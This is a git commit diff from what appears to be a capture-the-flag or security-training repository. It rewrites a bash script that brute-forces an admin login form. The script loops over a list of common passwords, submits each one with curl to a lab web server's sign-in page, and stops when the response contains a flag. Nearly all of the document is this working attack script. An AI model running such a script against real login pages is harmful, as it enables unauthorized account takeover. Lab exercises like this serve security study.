b456dec4415b25681ae5b0f5424e0ab24ccd27b1
ziakor <dimitrihauet@gmail.com>
2021-05-18 08:55:53 +0200

    ajout faille cookie admin et recovery password

--- login_Bruteforce/Ressources/bruteforce.sh
+++ login_Bruteforce/Ressources/bruteforce.sh
@@ -1,6 +1,11 @@
 #!/bin/bash
-tab = ('password' ,'123456' ,'12345678' ,'qwerty' ,'abc123', 'monkey' ,'1234567', 'letmein', 'trustno1', 'dragon', 'baseball' ,'111111' ,'iloveyou', 'master' ,'sunshine' ,'ashley' ,'bailey', 'passw0rd' ,'shadow' ,'123123' ,'654321' ,'superman', 'qazwsx' ,'michael', 'Football' ,'123qwe' ,'55555', 'admin', 'flower')
+tab=(password	123456	12345678	qwerty	abc123	monkey	1234567	letmein	trustno1 dragon baseball 111111 iloveyou master sunshine ashley bailey passw0rd shadow 123123 654321 superman qazwsx michael)
 
 for i in ${tab[@]}; do
-  echo -n tab[$i];
+  RES=$(curl --silent "http://192.168.1.11/?page=signin&username=admin&password=${i}&Login=Login")
+  # echo $RES
+  if [[  $RES =~ "flag" ]]; then
+    echo -n "login: "admin" and password: "$i""
+    break
+  fi
 done
